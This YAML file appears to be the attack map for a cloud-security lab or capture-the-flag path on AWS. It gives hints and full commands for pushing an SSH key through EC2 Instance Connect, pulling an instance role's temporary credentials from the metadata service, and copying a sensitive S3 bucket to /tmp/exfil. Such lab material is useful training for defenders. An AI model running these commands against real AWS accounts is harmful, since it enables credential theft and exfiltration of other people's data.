attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-bucket-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has ec2-instance-connect:SendSSHPublicKey permission on the target
        EC2 instance, along with ec2:DescribeInstances, iam:GetInstanceProfile, and
        iam:GetRole for reconnaissance.

    - id: ec2-instance
      label: "EC2 Instance"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx"
      description: >
        This EC2 instance (Amazon Linux 2023) has EC2 Instance Connect enabled and has an
        IAM instance profile attached that grants S3 bucket read access. By pushing an SSH
        public key to this instance via EC2 Instance Connect, you can establish a shell
        session and query the Instance Metadata Service to extract the role's temporary
        credentials.

    - id: ec2-role
      label: "EC2 Bucket Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-bucket-ec2-bucket-role"
      description: >
        This IAM role is attached to the EC2 instance via an instance profile. By SSHing
        into the instance and querying the instance metadata service, you can obtain
        temporary credentials for this role. The role has s3:GetObject and s3:ListBucket
        permissions on the sensitive S3 bucket.

    - id: target-bucket
      label: "Sensitive S3 Bucket"
      type: resource
      subType: s3-bucket
      isTarget: true
      arn: "arn:aws:s3:::pl-sensitive-data-ec2-003-{account_id}-{suffix}"
      description: >
        This S3 bucket contains sensitive data files. The EC2 bucket role has s3:GetObject
        and s3:ListBucket permissions on this bucket, allowing the attacker to list and
        download all objects.

  edges:
    - from: starting-principal
      to: ec2-instance
      label: "ec2-instance-connect:SendSSHPublicKey"
      description: >
        Push a temporary SSH public key to the EC2 instance using EC2 Instance Connect.
        The key is valid for 60 seconds — enough time to establish an SSH session.
      hints:
        - "Generate a local SSH key pair, then call ec2-instance-connect:SendSSHPublicKey to push your public key to the instance (you need the instance ID, OS user, and availability zone). The key is only valid for 60 seconds — have your SSH command ready before pushing."
        - "Once inside the SSH session, use IMDSv2 to extract the role's temporary credentials: PUT to /latest/api/token to get a session token, then query /latest/meta-data/iam/security-credentials/<ROLE_NAME>. Export the AccessKeyId, SecretAccessKey, and Token locally and use s3:ListBucket and s3:GetObject to read the sensitive bucket."
        - "Browse to https://pathfinding.cloud/paths/ec2-003 for full technique details."
      commands:
        - description: "List running EC2 instances and their attached instance profiles"
          command: "aws ec2 describe-instances --region REGION --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output table"
        - description: "Get the availability zone of the target instance (required for SendSSHPublicKey)"
          command: "aws ec2 describe-instances --region REGION --instance-ids INSTANCE_ID --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' --output text"
        - description: "Generate a temporary SSH key pair"
          command: "ssh-keygen -t rsa -f /tmp/ec2-003-temp-key -N '' -q"
        - description: "Push the public key to the EC2 instance (valid for 60 seconds)"
          command: "aws ec2-instance-connect send-ssh-public-key --instance-id INSTANCE_ID --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2-003-temp-key.pub --availability-zone AVAILABILITY_ZONE --region REGION"
        - description: "SSH into the instance within the 60-second window"
          command: "ssh -i /tmp/ec2-003-temp-key -o StrictHostKeyChecking=no ec2-user@INSTANCE_PUBLIC_IP"

    - from: ec2-instance
      to: ec2-role
      label: "IMDS credential extraction"
      description: >
        From within the EC2 instance, query IMDSv2 to retrieve the temporary IAM role
        credentials associated with the attached instance profile.
      hints: []
      commands:
        - description: "Get an IMDSv2 session token"
          command: "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')"
        - description: "Get the role name from IMDS"
          command: "ROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
        - description: "Extract the temporary credentials"
          command: "CREDS=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)"

    - from: ec2-role
      to: target-bucket
      label: "s3:GetObject, s3:ListBucket"
      description: >
        Use the EC2 bucket role's temporary credentials to list and download objects
        from the sensitive S3 bucket.
      hints:
        - "Export the extracted credentials as AWS environment variables (including AWS_SESSION_TOKEN) and use s3:ListBucket and s3:GetObject to read the sensitive data from the target bucket."
      commands:
        - description: "Export the extracted credentials as environment variables"
          command: "export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId) AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey) AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)"
        - description: "Verify the new identity"
          command: "aws sts get-caller-identity"
        - description: "List objects in the sensitive S3 bucket"
          command: "aws s3 ls s3://pl-sensitive-data-ec2-003-{account_id}-{suffix}/"
        - description: "Download objects from the S3 bucket"
          command: "aws s3 cp s3://pl-sensitive-data-ec2-003-{account_id}-{suffix}/ /tmp/exfil/ --recursive"
        - description: "Retrieve the CTF flag"
          command: "aws s3 cp s3://pl-sensitive-data-ec2-003-{account_id}-{suffix}/flag.txt -"
